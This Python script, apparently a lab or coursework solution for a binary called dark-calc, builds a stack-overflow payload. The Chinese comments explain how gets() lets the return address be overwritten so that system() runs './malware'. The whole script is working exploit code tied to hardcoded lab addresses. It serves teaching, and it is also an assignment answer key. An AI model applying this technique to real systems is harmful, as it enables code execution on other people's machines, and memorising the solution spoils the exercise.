#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

利用 input() 中 gets() 的栈溢出漏洞：
  - input() 的栈帧上，缓冲区 expression 位于 rbp-0x10（16 字节），
    往上 8 字节是保存的 rbp，再往上 8 字节（偏移 24 处）是返回地址。
  - input() 在返回前会把 expression 原样 strcpy 到全局缓冲区 command_buf
    （地址 0x6030d0），因此 command_buf 中的内容就是本 payload 的前缀。
  - 把返回地址改写为 eval() 中 0x401a6b 处（movl $command_buf, %edi;
    callq system@plt），即可跳过拼接 "echo $((...))" 的过程，
    直接让 system() 执行我们写在 command_buf 里的命令 "./malware"。
  - "#" 之后的溢出填充字节对 shell 而言是注释，不会影响命令执行。
"""
import sys


def p64(x: int) -> bytes:
    return x.to_bytes(8, "little")


# eval() 中准备调用 system(command_buf) 的位置：
#   401a6b: movl $0x6030d0, %edi      ; rdi = &command_buf
#   401a70: callq system@plt
EVAL_SYSTEM = 0x401A6B

CMD = b"./malware #"  # 让 system() 执行 ./malware，# 把后面的填充注释掉

payload = CMD
payload += b"A" * (24 - len(CMD))  # 填满 16 字节缓冲区 + 8 字节保存的 rbp
payload += p64(EVAL_SYSTEM)         # 覆盖 input() 的返回地址

sys.stdout.buffer.write(payload)
